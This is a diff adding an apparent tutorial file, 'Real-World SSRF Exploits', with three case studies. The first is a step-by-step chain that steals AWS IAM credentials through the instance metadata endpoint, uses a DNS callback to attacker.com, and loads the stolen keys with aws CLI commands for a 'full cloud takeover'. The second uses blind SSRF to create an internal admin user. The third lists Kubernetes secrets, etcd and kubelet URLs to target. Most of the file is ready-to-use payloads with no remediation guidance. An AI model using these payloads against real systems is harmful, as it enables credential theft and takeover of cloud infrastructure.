@@ -1,0 +1,73 @@
+Real-World SSRF Exploits
+Case Study 1: AWS Metadata Credential Theft
+
+Scenario: Image processing API that fetches images from URLs
+python
+
+# Vulnerable endpoint
+POST /api/process-image HTTP/1.1
+Host: target.com
+Content-Type: application/json
+
+{
+    "image_url": "https://example.com/photo.jpg"
+}
+
+Exploitation Chain:
+bash
+
+# Step 1: Test for SSRF
+POST /api/process-image
+{"image_url": "http://169.254.169.254/latest/meta-data/"}
+
+# Step 2: If blind, use DNS callback
+{"image_url": "http://attacker.com/callback?data="}
+
+# Step 3: Access metadata (after bypassing filters)
+{"image_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"} → Role name
+
+# Step 4: Get credentials
+{"image_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole"}
+
+# Response (even if blind, you might get errors)
+{
+    "AccessKeyId": "ASIA5FB...",
+    "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCY...",
+    "Token": "IQoJb3JpZ2luX2VjEA...",
+    "Expiration": "2024-12-31T23:59:59Z"
+}
+
+# Step 5: Use credentials
+aws configure set aws_access_key_id ASIA5FB...
+aws configure set aws_secret_access_key wJalrXUtnF...
+aws configure set aws_session_token IQoJb3Jp...
+
+# Step 6: Full cloud takeover
+aws s3 ls --profile stolen
+aws ec2 describe-instances
+
+Case Study 2: Internal API Manipulation
+
+Scenario: PDF generator that includes remote content
+python
+
+# Blind SSRF to internal admin API
+POST /api/generate-pdf
+{
+    "content_url": "http://internal-admin:8080/api/users?action=create&username=admin&password=hacked"
+}
+
+# Even without response, the action executes
+# New admin user created internally
+
+Case Study 3: Kubernetes ETCD Access
+bash
+
+# K8s API server (often exposed internally)
+http://kubernetes.default.svc/api/v1/namespaces/default/secrets/
+
+# Direct ETCD (if accessible)
+http://127.0.0.1:2379/v2/keys/?recursive=true
+
+# Kubelet API (credentials)
+http://127.0.0.1:10255/pods
